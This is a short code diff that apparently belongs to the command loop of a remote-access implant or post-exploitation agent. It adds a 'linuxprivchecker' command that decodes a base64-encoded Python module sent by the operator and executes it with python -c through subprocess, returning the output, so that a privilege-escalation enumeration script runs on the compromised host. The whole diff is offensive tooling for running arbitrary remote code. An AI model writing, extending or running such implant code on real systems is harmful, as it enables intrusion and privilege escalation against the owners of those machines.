@@ -197,6 +197,19 @@ while(True):
               except Exception as e:
                 returnval = "Error with source file: %%s" %% e
               
+            elif cmd.startswith("linuxprivchecker"):
+              args = cmd[len('linuxprivchecker'):].strip()
+              args = args.split()
+              pycode_index = args.index('-pycode')
+              encoded_module = args[pycode_index +1]
+              args.pop(pycode_index)
+              args.pop(pycode_index)
+              pycode = base64.b64decode(encoded_module)
+              process = ['python', '-c', pycode]
+              pycode = 'import sys; sys.argv = sys.argv[1:];' + pycode
+              import subprocess
+              returnval = subprocess.check_output(['python', '-c', pycode] + args)
+
             elif cmd[:6] == "python":
               module = cmd.replace("python ","")
               try:
